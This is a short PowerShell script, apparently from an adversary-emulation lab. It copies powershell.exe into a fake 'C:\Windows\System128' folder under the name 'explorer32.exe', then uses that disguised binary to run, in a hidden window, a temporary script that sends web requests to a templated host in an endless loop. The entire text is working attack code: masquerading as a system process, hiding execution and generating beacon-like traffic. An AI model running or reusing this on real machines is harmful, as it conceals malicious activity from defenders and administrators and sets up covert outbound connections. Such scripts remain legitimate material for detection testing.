if (! (Test-Path "C:\Windows\System128"))
{
  New-Item -Path "C:\Windows\System128" -ItemType "directory"
}
Copy-Item "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "C:\Windows\System128\explorer32.exe"

# export DOLLAR='$'
# $DOLLAR

@'
$progressPreference = 'silentlyContinue'
while (1) {
  Invoke-WebRequest -uri http://$WWW1_IP/gros -UseBasicParsing
}
$progressPreference = 'Continue'
'@ | Out-File $env:TEMP\tmp.ps1

Start-Process -FilePath C:\Windows\System128\explorer32.exe -ArgumentList "-File","$env:TEMP\tmp.ps1" -WindowStyle Hidden
